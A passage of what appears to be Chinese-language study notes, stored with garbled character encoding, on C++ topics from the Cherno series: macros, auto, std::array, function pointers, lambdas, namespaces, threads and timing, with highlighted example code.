çŸ¥é“æ‰€æœ‰çš„C++ç‰¹æ€§ï¼Œå°¤å…¶æ˜¯é«˜çº§ç‰¹æ€§æ›´åº”å½“å‡å°‘ä½¿ç”¨ï¼ˆæ–°æ‰‹å¸¸çŠ¯çš„è¯¯åŒºï¼‰ã€‚<br>ä½¿ç”¨å®ä¼šè®©åˆ«äººå›°æƒ‘ï¼Œåˆ«äººå¾—å»æ‰¾åˆ°å®æ‰èƒ½çœ‹æ‡‚ã€‚</p><p>é€‚åˆç”¨å®çš„åœºæ™¯ï¼šåœ¨ç°å®å¼€å‘ä¸­åœ¨å¼€å‘é˜¶æ®µéœ€è¦æ—¥å¿—ç³»ç»Ÿï¼Œåœ¨å‘å¸ƒé˜¶æ®µå¯èƒ½éœ€è¦å»æ‰ï¼ˆå‡å°‘é€éœ²ä¿¡æ¯ï¼Œæå‡æ€§èƒ½ï¼‰ã€‚</p><p>åœ¨VSé¡¹ç›®å±æ€§è®¾ç½®ä¸­ï¼Œåœ¨**â€œDEBUGâ€é…ç½®ä¸­é¢„å¤„ç†å™¨-é¢„å¤„ç†å™¨å®šä¹‰ä¸­è®¾ç½®<code>PR_DEBUG=1</code>** ï¼ˆæ³¨æ„ä¸è¦æœ‰ç©ºæ ¼ï¼Œä¸è¿‡å¥½åƒæœ‰ä¹Ÿæ²¡äº‹ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨#ifæ¯”ä½¿ç”¨#ifdefè¦å¥½</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PR_DEBUG == 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">LOG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥ä½¿ç”¨åæ–œæ å¯¹æ¢è¡Œç¬¦è¿›è¡Œè½¬ç§»</strong>ï¼Œæ³¨æ„åé¢ä¸è¦æœ‰ç©ºæ ¼ï¼Œå¦åˆ™å°±æ˜¯å¯¹ç©ºæ ¼è½¬ä¹‰è€Œéå¯¹æ¢è¡Œç¬¦è½¬ä¹‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN int main() &#123;\</span></span><br><span class="line"><span class="meta">  std::cin.get();\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="56-The-â€œautoâ€-keyword-in-C">56 The â€œautoâ€ keyword in C++</h1><p>ä¸¤é¢æ€§ï¼šä¸€æ–¹é¢APIæ”¹å˜ä¿®æ”¹è¿”å›å€¼ç±»å‹åå®¢æˆ·ç«¯ä¸éœ€è¦ä¿®æ”¹ï¼Œå¦ä¸€æ–¹é¢å¯èƒ½ä¼š<strong>ç ´åä¾èµ–äºç‰¹å®šç±»å‹çš„ä»£ç ã€è¿˜ä¼šé™ä½å¯è¯»æ€§</strong>ï¼ˆåˆ«äººä¸èƒ½å¾ˆå¿«æ˜ç™½ç±»å‹ï¼‰ã€‚</p><p>æ¨èï¼šå¦‚æœç±»å‹éå¸¸é•¿å°±æ¨èç”¨ï¼Œæ­¤æ—¶å½“è¿›å…¥éå¸¸å¤æ‚çš„ä»£ç é›†ï¼ŒåŒ…å«äº†æ¨¡æ¿ç­‰ï¼Œå°±ä¸å¾—ä¸ç”¨autoï¼Œå› ä¸ºä¸çŸ¥é“ç±»å‹æ˜¯ä»€ä¹ˆï¼ˆä¸è¦å†™è¿™ä¹ˆå¤æ‚çš„ä»£ç ï¼Œè¿™å¾ˆéš¾å‘åˆ«äººè§£é‡Šä»£ç å¦‚ä½•å·¥ä½œï¼Œå¾ˆéš¾ç»´æŠ¤ï¼‰ã€‚</p><p>autoä¸ä¼šåŠ å¼•ç”¨ï¼Œå­˜å‚¨è¿”å›ç»“æœå¾—ç”¨ <code>const auto&amp; res =</code></p><h1 id="57-Static-Arrays-in-C-std-array">57 Static Arrays in C++ (std::array)</h1><p>std::arrayä¹Ÿæ˜¯æ”¾åœ¨æ ˆä¸Šï¼Œå’Œæ™®é€šæ•°ç»„çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œä¸éœ€è¦æ‰‹åŠ¨ç»´æŠ¤æ•°ç»„å¤§å°ï¼Œè¿˜èƒ½ä½¿ç”¨sortç­‰æ ‡å‡†å‡½æ•°ï¼Œè¿˜èƒ½å¯é€‰è¾¹ç•Œæ£€æŸ¥ï¼ˆReleaseæ¨¡å¼ä¸‹æ— ï¼Œè¾¹ç•Œæ£€æŸ¥ä¼šå½±å“ç¨‹åºæ€§èƒ½ï¼‰ã€‚è€Œstd::vectoræ˜¯åœ¨å †ä¸Šã€‚<br>std::arrayçš„sizeç›´æ¥è¿”å›æ¨¡æ¿å‚æ•°ï¼Œä¸æ˜¯è¿”å›sizeå˜é‡ç­‰â€”â€”<strong>ä¸é¢å¤–å ç”¨ç©ºé—´</strong>ã€‚<br><strong>std::arrayçš„å®ç°ç›¸å½“é«˜æ•ˆï¼Œåº”è¯¥ç”¨å…¶æ›¿ä»£Cé£æ ¼çš„æ•°ç»„ã€‚</strong></p><p><strong>å¤´æ–‡ä»¶å¦‚æœæ˜¯ä¸€ä¸ªæ¨¡æ¿ç±»ï¼Œå¤´æ–‡ä»¶å°±æ˜¯æ‰€éœ€çš„å…¨éƒ¨ï¼Œä¸éœ€è¦å®ç°æ–‡ä»¶ã€‚</strong></p><h1 id="58-Function-Pointers-in-C">58 Function Pointers in C++</h1><p>æœ¬èŠ‚è¯¾è®²åŸå§‹Cé£æ ¼çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>å‡½æ•°æŒ‡é’ˆæ˜¯å°†ä¸€ä¸ªå‡½æ•°èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡çš„æ–¹æ³•ï¼Œè¿™ä¸æˆ‘ä»¬ä¹‹å‰é€šè¿‡()è°ƒç”¨å‡½æ•°çš„ä½¿ç”¨æ–¹æ³•ä¸åŒï¼Œæ‰©å±•ï¼šè¿˜èƒ½å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ ç»™å…¶ä»–å‡½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HelloWorld</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello World! Value: &quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//auto func = HelloWorld;  // æ³•1ï¼Œæ¨è</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// void(*func)(int) = HelloWorld;  // æ³•2, Cé£æ ¼å‡½æ•°æŒ‡é’ˆçœŸçš„å¾ˆå¥‡æ€ª</span></span><br><span class="line">  <span class="comment">// voidæŒ‡è¿”å›å€¼ç±»å‹</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*HelloWorldFunc)</span><span class="params">(<span class="type">int</span>)</span></span>;  <span class="comment">// æ³•3</span></span><br><span class="line">  HelloWorldFunc func = HelloWorld;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">func</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lambdaæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œåªæ˜¯<strong>å®ƒä¸åƒæ™®é€šå‡½æ•°è¿™æ ·å£°æ˜ï¼Œå®ƒæ˜¯åœ¨æˆ‘ä»¬çš„ä»£ç åœ¨è¿‡ç¨‹ä¸­ç”Ÿæˆçš„ï¼Œç”¨å®Œå³å¼ƒçš„å‡½æ•°ã€‚</strong></p><p>[ ] å«åš æ•è·æ–¹å¼ï¼Œå³å¦‚ä½•ä¼ å…¥ä¼ å‡ºå‚æ•°ã€‚</p><p>æ³¨æ„ä¸‹é¢ä»£ç ä¸­ å‡½æ•°æŒ‡é’ˆ çš„å†™æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ForEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">void</span>(*func)(<span class="type">int</span>))</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> value : values) &#123;</span><br><span class="line">    <span class="built_in">func</span>(value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;  <span class="comment">// åˆå§‹åŒ–åˆ—è¡¨</span></span><br><span class="line">  <span class="built_in">ForEach</span>(values, [](<span class="type">int</span> value) &#123;  <span class="comment">// lambdaè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ä¼ é€’</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Values: &quot;</span> &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">    &#125;);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="59-Lambdas-in-C">59 Lambdas in C++</h1><p>lambdaæœ¬è´¨ä¸Šæ˜¯å®šä¹‰ä¸€ç§å«ä½œåŒ¿åå‡½æ•°çš„æ–¹å¼ï¼Œä¸éœ€è¦å®é™…åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œå°±åƒä¸€ä¸ªå¿«é€Ÿçš„ä¸€æ¬¡æ€§å‡½æ•°ï¼Œå±•ç¤ºä¸‹éœ€è¦è¿è¡Œçš„ä»£ç ã€‚<strong>å®ƒæ›´åƒä¸€ä¸ªå˜é‡ï¼Œè€Œéä¸€ä¸ªæ­£å¼çš„å‡½æ•°ï¼Œåœ¨å®é™…ç¼–è¯‘çš„ä»£ç ä¸­ä½œä¸ºä¸€ä¸ªç¬¦å·å­˜åœ¨</strong>ã€‚</p><p>å·¥ä½œåŸç†ï¼šåªè¦ä½ æœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œéƒ½å¯ä»¥åœ¨C++ä¸­ä½¿ç”¨lambdaã€‚</p><p>ç”¨æ³•ï¼šåœ¨æˆ‘ä»¬ä¼šè®¾ç½®å‡½æ•°æŒ‡é’ˆæŒ‡å‘å‡½æ•°çš„ä»»ä½•åœ°æ–¹ï¼Œéƒ½å¯ä»¥å°†å®ƒè®¾ç½®æˆlambdaã€‚æˆ‘ä»¬æ‰€åšçš„å°±æ˜¯æ„é€ ä¸€ä¸ªç¨åä¼šè°ƒç”¨çš„å‡½æ•°ã€‚</p><p>[ ] æ•è·æ–¹å¼ï¼šæ‰“ç®—å¦‚ä½•ä¼ é€’å˜é‡ã€‚</p><ul><li>[=] å…¨éƒ¨æŒ‰å€¼ä¼ é€’ã€‚</li><li>[&amp;] å…¨éƒ¨æŒ‰å¼•ç”¨ä¼ é€’ã€‚</li><li>[a, &amp;b] aé€šè¿‡å€¼ä¼ é€’ï¼Œbé€šè¿‡å¼•ç”¨ä¼ é€’ã€‚</li></ul><p><strong>éæ•è·lambdaå¯ä»¥éšå¼è½¬æ¢ä¸ºå‡½æ•°æŒ‡é’ˆï¼Œè€Œæœ‰æ•è·lambdaä¸å¯ä»¥ã€‚</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>**</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ— æ³•å°†å‚æ•° 2 ä»â€œmain::&lt;lambda_2&gt;â€è½¬æ¢ä¸ºâ€œvoid(__cdecl*)(int)â€</span></span><br><span class="line"><span class="comment">//void ForEach(const std::vector&lt;int&gt;&amp; values, void(*func)(int)) &#123;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ForEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">const</span> std::function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt;&amp; func)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> value : values)</span><br><span class="line">    <span class="built_in">func</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">  <span class="keyword">auto</span> it = std::<span class="built_in">find_if</span>(values.<span class="built_in">begin</span>(), values.<span class="built_in">end</span>(), [](<span class="type">int</span> value) &#123;<span class="keyword">return</span> value &gt; <span class="number">0</span>; &#125;);</span><br><span class="line">  std::cout &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">auto</span> lambda = [=](<span class="type">int</span> value) &#123;std::cout &lt;&lt; <span class="string">&quot;Values: &quot;</span> &lt;&lt; value &lt;&lt; std::endl; &#125;;</span><br><span class="line">  <span class="built_in">ForEach</span>(values, lambda);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="60-Why-I-donâ€™t-â€œusing-namespace-stdâ€">60 Why I donâ€™t â€œusing namespace stdâ€</h1><p>ä½¿ç”¨using namespace stdåå°±ä¸çŸ¥é“æ‰€çŸ¥ç”¨çš„å‡½æ•°æ¥è‡ªå“ªä¸ªnamespaceã€‚å…¬å¸å¯èƒ½ä¼šæœ‰è‡ªå·±çš„stlç‰ˆæœ¬ï¼Œæ¯”å¦‚EASTLï¼Œstd::vectorå’Œeastl::vectorå¥½åŒºåˆ†ï¼Œè€Œä½¿ç”¨using namespace è¯­å¥åå°±æ²¡é‚£ä¹ˆå®¹æ˜“åŒºåˆ†äº†ã€‚</p><p><strong>ç»å¯¹ä¸è¦åœ¨å¤´æ–‡ä»¶ä¸­ä½¿ç”¨using namespace</strong>ã€‚<br>chernoä¹Ÿä¼šç”¨using namespaceï¼Œä½†åªä¼šusingè‡ªå·±çš„åº“ï¼Œè€Œä¸ä¼šä½¿ç”¨stdæˆ–è€…eastlã€‚<br>å¦‚æœç¡®å®è¦ä½¿ç”¨using namespaceï¼Œå°±<strong>åœ¨ä¸€ä¸ªè¶³å¤Ÿå°çš„ä½œç”¨åŸŸä¸‹ä½¿ç”¨ã€‚</strong></p><h1 id="61-Namespaces-in-C">61 Namespaces in C++</h1><p>Cä¸­æ— å‘½åç©ºé—´ï¼Œä¸èƒ½å°†ä¸€ä¸ªå‡½æ•°å‘½åä¸ºInitï¼Œå¾—å«glfwInitï¼ŒglBeginç­‰ã€‚</p><p>C++ä¸­æœ‰å‘½åç©ºé—´ï¼Œä¸»è¦ç›®çš„æ˜¯é¿å…å‘½åå†²çªï¼Œå¸Œæœ›èƒ½å¤Ÿåœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ç›¸åŒçš„ç¬¦å·ã€‚</p><p><code>::</code> æ˜¯å‘½åç©ºé—´æ“ä½œç¬¦ã€‚</p><p>**ç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§å‘½åç©ºé—´ï¼›**æšä¸¾ä¸æ˜¯å‘½åç©ºé—´ï¼Œè€Œæšä¸¾ç±»æ˜¯ã€‚</p><p>ä¸€èˆ¬åœ¨å¤´æ–‡ä»¶.hä¸­ç¦æ­¢ä½¿ç”¨using namespaceï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åˆ«äººå¼•ç”¨ä½ çš„å¤´æ–‡ä»¶æ—¶å‡ºç°å†²çªã€‚åœ¨cppé‡Œä½ å¯ä»¥ç”¨ï¼Œä½†ä¸ºäº†å…»æˆè‰¯å¥½ä¹ æƒ¯ä¸€èˆ¬ç”¨ä»€ä¹ˆå†™ä»€ä¹ˆï¼Œæ¯”å¦‚using std::vector;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">using</span> <span class="title">orange::print</span><span class="params">()</span></span>;  <span class="comment">// åªä¸ºprintæŒ‡å®šå‘½åç©ºé—´ï¼Œprint_againéœ€å†æŒ‡å®š</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">apple::<span class="built_in">print_again</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> o = orange;  <span class="comment">// ä¸ºnamespaceèµ·åˆ«å</span></span><br><span class="line">o::<span class="built_in">print</span>();</span><br></pre></td></tr></table></figure><p><strong>ä¸¥è‚ƒé¡¹ç›®ä¸­ï¼Œæ‰€æœ‰å‡½æ•°éƒ½åº”æ”¾åœ¨namespace xxx {} é‡Œé¢ã€‚</strong></p><h1 id="62-Threads-in-C">62 Threads in C++</h1><p>å¦‚æœä¸ä½¿ç”¨çº¿ç¨‹ï¼Œæ— æ³•è®©ç¨‹åºåŒæ—¶åšä¸¤ä»¶äº‹ï¼ˆæ¯”å¦‚åŒæ—¶ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œå’Œå‘æ§åˆ¶å°æ‰“å°æ¶ˆæ¯ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> s_Finished = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoWork</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std::literals::chrono_literals;  <span class="comment">// 1séœ€è¦</span></span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Thread id = &quot;</span> &lt;&lt; std::this_thread::<span class="built_in">get_id</span>() &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">while</span> (!s_Finished) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Working...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::this_thread::<span class="built_in">sleep_for</span>(<span class="number">1</span>s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">std::thread <span class="title">worker</span><span class="params">(DoWork)</span></span>;  <span class="comment">// å‚æ•°ä¸º å‡½æ•°æŒ‡é’ˆ å’Œ å‡½æ•°å‚æ•°</span></span><br><span class="line">  <span class="comment">// eg: std::thread second (bar,0);</span></span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">  s_Finished = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  worker.<span class="built_in">join</span>();  <span class="comment">// mainçº¿ç¨‹é˜»å¡ï¼Œç­‰å¾…workerçº¿ç¨‹é€€å‡º</span></span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Thread id = &quot;</span> &lt;&lt; std::this_thread::<span class="built_in">get_id</span>() &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="63-Timing-in-C">63 Timing in C++</h1><p>æ ‡å‡†å†™æ³•å¯å‚è€ƒ<a href="https://www.notion.so/Cherno-17f2e807a69841bcb3e75063a6b2827d?pvs=21">74</a></p><p><strong>chronoæ˜¯C++åº“çš„ä¸€éƒ¨åˆ†ï¼ˆC++11ï¼‰</strong>ï¼Œä¸éœ€è¦ä½¿ç”¨æ“ä½œç³»ç»Ÿã€‚åœ¨chronoä¹‹å‰ï¼Œå¦‚æœæƒ³è¦éå¸¸ç²¾ç¡®çš„è®¡æ—¶å™¨ï¼Œéœ€è¦ä½¿ç”¨æ“ä½œç³»ç»Ÿåº“ï¼ˆWindowsä¸­ï¼Œæœ‰QueryPerformanceCounterï¼‰ã€‚</p><p>chronoä¸å¹³å°æ— å…³ï¼Œæ¨èä½¿ç”¨ï¼ˆ99%æƒ…å†µä¸‹ä½¿ç”¨chronoå°±å¥½ï¼‰ï¼Œé™¤éæ­£åœ¨åšä¸€äº›ç‰¹å®šçš„åº•å±‚çš„äº‹æƒ…å¸Œæœ›è¿›ä¸€æ­¥å‡å°‘å¼€é”€ï¼Œæˆ–è€…æƒ³è¦ä½¿ç”¨ç‰¹å®šäºå¹³å°çš„åº“ã€‚</p><p>std::endl å¾ˆæ…¢ï¼Œæ¨èæ¢æˆ \nã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std::literals::chrono_literals;</span><br><span class="line"></span><br><span class="line">  std::chrono::time_point&lt;std::chrono::steady_clock&gt; start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">  std::this_thread::<span class="built_in">sleep_for</span>(<span class="number">1</span>s);</span><br><span class="line">  <span class="keyword">auto</span> end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line"></span><br><span class="line">  std::chrono::duration&lt;<span class="type">float</span>&gt; duration;</span><br><span class="line">  duration = end - start;</span><br><span class="line">  std::cout &lt;&lt; duration.<span class="built_in">count</span>() &lt;&lt; <span class="string">&quot;s&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  </span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>instrumentationï¼ˆæ’ç ï¼‰</code>ï¼Œå¯ä»¥ä½¿ç”¨æ’ç æ¥å®é™…ä¿®æ”¹æºä»£ç ï¼Œä»¥åŒ…å«æŸç§åˆ†æå·¥å…·ã€‚</p><p><strong>è®°æ—¶ç±»</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Timer</span> &#123;</span><br><span class="line">  std::chrono::time_point&lt;std::chrono::steady_clock&gt; start, end;</span><br><span class="line">  std::chrono::duration&lt;<span class="type">float</span>&gt; duration;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Timer</span>() &#123;</span><br><span class="line">    start = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">Timer</span>() &#123;</span><br><span class="line">    end = std::chrono::high_resolution_clock::<span class="built_in">now</span>();</span><br><span class="line">    duration = end - start;</span><br><span class="line">    <span class="type">float</span> ms = duration.<span class="built_in">count</span>() * <span class="number">1000.0f</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Timer took &quot;</span> &lt;&lt; ms &lt;&lt; <span class="string">&quot;ms\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Timer timer;  <span class="comment">// æ’ç </span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span 